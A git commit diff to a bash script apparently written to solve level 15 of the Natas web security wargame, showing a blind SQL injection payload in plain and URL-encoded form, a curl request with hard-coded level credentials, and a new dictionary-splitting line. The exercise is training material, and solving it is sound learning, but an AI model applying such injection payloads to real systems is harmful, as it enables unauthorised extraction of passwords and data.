ba091a74c4f5f1ce322fe436e0f992382ba60446
Perin <joaovperin@live.com>
2018-05-08 09:46:50 -0300

    Created an array based on the dictionary string

--- natas/natas15/brute.sh
+++ natas/natas15/brute.sh
@@ -7,7 +7,10 @@ passlen=17              # Example: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 sql='?username=natas16" AND password LIKE BINARY "%'
 encSql="?username=natas16%22%20AND%20password%20LIKE%20BINARY%20%22%25"
 
+# Creates an Array based on the dictionary
+arr=$(echo "${dict}" | sed -rn 's/(.)/\1\n/gp')
+
 # Array to store found letters.  http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_10_02.html
 found=()
 
-curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J ${url}/${encSql}
+echo "curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J ${url}/${encSql}"
